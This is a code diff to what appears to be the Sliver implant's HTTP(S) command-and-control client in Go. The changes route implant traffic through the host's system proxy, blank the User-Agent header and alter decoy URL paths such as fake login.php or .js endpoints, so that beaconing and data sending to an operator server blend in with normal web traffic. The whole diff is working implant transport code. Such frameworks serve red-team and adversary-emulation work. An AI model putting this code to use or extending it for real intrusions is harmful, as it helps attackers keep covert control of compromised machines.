@@ -17,6 +17,7 @@ import (
 	"encoding/pem"
 	"errors"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"strings"
 
@@ -46,14 +47,14 @@ const (
 // HTTPStartSession - Attempts to start a session with a given address
 func HTTPStartSession(address string) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
-	client = httpsClient(address)
+	client = httpsClient(address, true)
 	err := client.SessionInit()
 	if err != nil {
 		// If we're using default ports then switch to 80
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
 		}
-		client = httpClient(address) // Fallback to insecure HTTP
+		client = httpClient(address, true) // Fallback to insecure HTTP
 		err = client.SessionInit()
 		if err != nil {
 			return nil, err
@@ -97,12 +98,18 @@ func (s *SliverHTTPClient) SessionInit() error {
 	return nil
 }
 
+func (s *SliverHTTPClient) newHTTPRequest(method, uri string, body io.Reader) *http.Request {
+	req, _ := http.NewRequest(method, uri, body)
+	req.Header.Set("User-Agent", "")
+	return req
+}
+
 func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 	uri := s.txtURL()
 	// {{if .Debug}}
 	log.Printf("[http] GET -> %s", uri)
 	// {{end}}
-	req, _ := http.NewRequest("GET", uri, nil)
+	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	resp, err := s.Client.Do(req)
 	if err != nil || resp.StatusCode != 200 {
 		// {{if .Debug}}
@@ -139,7 +146,7 @@ func (s *SliverHTTPClient) getPublicKey() *rsa.PublicKey {
 func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	reader := bytes.NewReader(sessionInit) // Already RSA encrypted
 	uri := s.cssURL()
-	req, _ := http.NewRequest("POST", uri, reader)
+	req := s.newHTTPRequest(http.MethodPost, uri, reader)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
@@ -169,7 +176,7 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		return nil, errors.New("no session")
 	}
 	uri := s.jsURL()
-	req, _ := http.NewRequest("GET", uri, nil)
+	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
@@ -205,7 +212,7 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 	// {{if .Debug}}
 	log.Printf("[http] POST -> %s", uri)
 	// {{end}}
-	req, _ := http.NewRequest("POST", uri, reader)
+	req := s.newHTTPRequest(http.MethodPost, uri, reader)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Debug}}
@@ -237,7 +244,7 @@ func (s *SliverHTTPClient) cssURL() string {
 
 func (s *SliverHTTPClient) phpURL() string {
 	curl, _ := url.Parse(s.Origin)
-	segments := []string{"api", "rest", "larvel", "wordpress"}
+	segments := []string{"api", "rest", "drupal", "wordpress"}
 	filenames := []string{"login.php", "signin.php", "api.php", "samples.php"}
 	curl.Path = path.Join(s.randomPath(segments, filenames)...)
 	return curl.String()
@@ -267,36 +274,45 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string) []s
 
 // [ HTTP(S) Clients ] ------------------------------------------------------------
 
-func httpClient(address string) *SliverHTTPClient {
-	p := proxy.NewProvider("").GetHTTPProxy("http://rapid7.com")
-	if p != nil {
-		// {{if .Debug}}
-		fmt.Printf("Found proxy: %s\n", p)
-		// {{end}}
+func httpClient(address string, useProxy bool) *SliverHTTPClient {
+	httpTransport := &http.Transport{
+		Dial: proxy.Direct.Dial,
 	}
-	return &SliverHTTPClient{
+	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("http://%s", address),
 		Client: &http.Client{
-			Jar:     cookieJar(),
-			Timeout: defaultReqTimeout,
+			Jar:       cookieJar(),
+			Timeout:   defaultReqTimeout,
+			Transport: httpTransport,
 		},
 	}
+	if useProxy {
+		p := proxy.NewProvider("").GetHTTPProxy(client.Origin)
+		if p != nil {
+			// {{if .Debug}}
+			log.Printf("Found proxy %#v\n", p)
+			// {{end}}
+			proxyURL := p.URL()
+			if proxyURL.Scheme == "" {
+				proxyURL.Scheme = "http"
+			}
+			// {{if .Debug}}
+			log.Printf("Proxy URL = '%s'\n", proxyURL)
+			// {{end}}
+			httpTransport.Proxy = http.ProxyURL(proxyURL)
+		}
+	}
+	return client
 }
 
-func httpsClient(address string) *SliverHTTPClient {
+func httpsClient(address string, useProxy bool) *SliverHTTPClient {
 	netTransport := &http.Transport{
 		Dial: (&net.Dialer{
 			Timeout: defaultNetTimeout,
 		}).Dial,
 		TLSHandshakeTimeout: defaultNetTimeout,
 	}
-	p := proxy.NewProvider("").GetHTTPSProxy("https://rapid7.com")
-	if p != nil {
-		// {{if .Debug}}
-		fmt.Printf("Found proxy: %s\n", p)
-		// {{end}}
-	}
-	return &SliverHTTPClient{
+	client := &SliverHTTPClient{
 		Origin: fmt.Sprintf("https://%s", address),
 		Client: &http.Client{
 			Jar:       cookieJar(),
@@ -304,6 +320,23 @@ func httpsClient(address string) *SliverHTTPClient {
 			Transport: netTransport,
 		},
 	}
+	if useProxy {
+		p := proxy.NewProvider("").GetHTTPSProxy(client.Origin)
+		if p != nil {
+			// {{if .Debug}}
+			log.Printf("Found proxy %#v\n", p)
+			// {{end}}
+			proxyURL := p.URL()
+			if proxyURL.Scheme == "" {
+				proxyURL.Scheme = "https"
+			}
+			// {{if .Debug}}
+			log.Printf("Proxy URL = '%s'\n", proxyURL)
+			// {{end}}
+			netTransport.Proxy = http.ProxyURL(proxyURL)
+		}
+	}
+	return client
 }
 
 // Jar - CookieJar implementation that ignores domains/origins
